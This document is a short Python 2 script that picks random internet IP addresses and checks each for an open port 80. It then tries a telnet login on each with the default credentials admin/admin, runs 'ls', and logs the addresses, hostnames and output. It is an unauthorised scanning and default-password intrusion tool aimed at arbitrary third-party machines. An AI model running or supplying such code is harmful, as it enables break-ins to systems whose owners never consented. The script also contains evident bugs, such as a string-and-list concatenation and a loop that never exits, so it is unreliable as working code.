import socket, os, time, telnetlib
from random import randint

def randip():
    while True:
        yield ".".join(str(randint(1, 255)) for i in range(4))

a = []
fp = open("randip_log.txt", 'w')
for address in randip():
	try:
		#Socket tests with a timeout of 0.8 seconds#
		s = socket.socket()
		s.settimeout(0.8)
		s.connect((address, 80))
		print address, "WORKS!!!"
		hostbyadr = socket.gethostbyaddr(address)
		print hostbyadr
		print "\n"
		fp.write(address)
		fp.write("\n")
		fp.write(str(hostbyadr))
		fp.write("\n")
		print('Beginning Telnet attempt on %s\n' % address)
		#Default telnet connection using admin as user and password#
		try:
			tn = telnetlib.Telnet(address, 3)
			tn.read_until("login: ")
			tn.write('admin' + '\n')
			tn.read_until('Password: ')
			tn.write('admin' + '\n')
			tn.write("ls\n")
			tn.write("exit\n")
			print tn.read_all()
			fp.write(tn.read_all())
			tn.close()
		except EOFError:
			print(EOFError)
			print(address)
		fp.write('\n')
		a.append(address)
		print('Hosts Attempted' + a + '\n')
		while len(a) != 4:
			continue
		else:
			print "..."
			fp.close()
			break
	except socket.error:
		print(socket.error)
		print(address)
